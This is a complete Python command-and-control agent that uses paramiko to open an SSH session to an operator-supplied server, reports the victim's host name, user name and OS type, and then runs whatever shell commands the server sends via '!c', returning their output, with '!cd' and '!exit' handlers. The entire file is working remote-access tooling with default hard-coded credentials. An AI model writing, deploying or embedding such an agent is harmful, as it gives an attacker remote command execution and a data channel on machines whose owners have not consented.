import paramiko
import subprocess
import os
import socket
import getpass
import argparse

parser = argparse.ArgumentParser(description="C2 agent configuration to communicate with server")
parser._action_groups.pop()
required = parser.add_argument_group("Required")
optional = parser.add_argument_group("Optional")
required.add_argument("-ip", dest="ip", help="Server IP")
optional.add_argument("-p", dest="port", type=int, default=2222, help="Server port (Default: 2222)")
optional.add_argument("-u", dest="user", default="sshUser", help="User to authenticate (Default: sshUser)")
optional.add_argument("-pwd", dest="password", default="sshPass", help="Password to authenticate (Default: sshPass)")

args = parser.parse_args()

def main():
    ip = args.ip #Server IP
    port = args.port #Server port
    username = args.user #Server username
    password = args.password #Server password

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password)
        session = client.get_transport().open_session()
        host = socket.gethostname()
        user = getpass.getuser()
        type = os.name
    except Exception as ex:
        print("[!] Unable to connect to server. Use -h for help.")
        exit()

    if session.active:
        session.sendall(f"{host},{user},{type}")
        print(session.recv(1024).decode())
        while True:
            try:
                incoming = session.recv(1024).decode()
                head = incoming.split(" ")[0]
                if head == "!exit":
                    exit()
                elif head == "!cd":
                    path = " ".join(incoming.split(" ")[1:])
                    os.chdir(path)
                    CWD = os.getcwd()
                    session.sendall(f"Current directory: {CWD}\n")
                elif head == "!c":
                    command = " ".join(incoming.split(" ")[1:])
                    output = subprocess.getoutput(command)
                    if (len(output) == 0):
                        session.sendall("[*] Command executed. No shell output.\n")
                    else:
                        session.sendall(output + "\n")
                else:
                    session.sendall("[!] Invalid.\n")
            except Exception as ex:
                session.sendall("[!] " + str(ex) + "\n")

if __name__ == "__main__":
    main()
